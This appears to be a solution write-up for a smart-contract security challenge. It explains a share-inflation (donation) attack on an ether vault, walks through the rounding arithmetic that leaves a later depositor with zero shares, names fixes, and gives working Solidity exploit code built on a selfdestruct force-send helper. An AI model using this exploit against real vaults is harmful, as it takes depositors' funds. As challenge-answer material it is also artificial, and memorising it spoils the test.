The bug is the classic share-inflation (donation) attack. The vault prices shares on `address(this).balance`, and that balance can be inflated by force-sending ether.

1. The attacker deposits 1 wei and receives 1 share.
2. The attacker force-sends the remaining ~1 ether into the vault with a selfdestructing helper, since the vault has no `receive`. Assets are now 1 ether against 1 share.
3. A deposits 2 ether and gets `2e18 * 1 / 1e18 = 2` shares. A still redeems about 2.33 ether, so A is fine.
4. B deposits 0.5 ether. Shares are `0.5e18 * 3 / 3e18`, which floors to 0, so B gets 0 shares and receives 0.

B's payout is below 99% of the deposit, which breaks the invariant. A patched vault that fixes the share pricing (virtual shares or a minimum-shares guard) would not leave B with 0 shares.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Burner {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract Exploit {
    address public vault;

    constructor(address target) payable {
        vault = target;
    }

    function run() external {
        IVault(vault).deposit{value: 1}();
        new Burner{value: address(this).balance}(vault);
    }

    receive() external payable {}
}
```
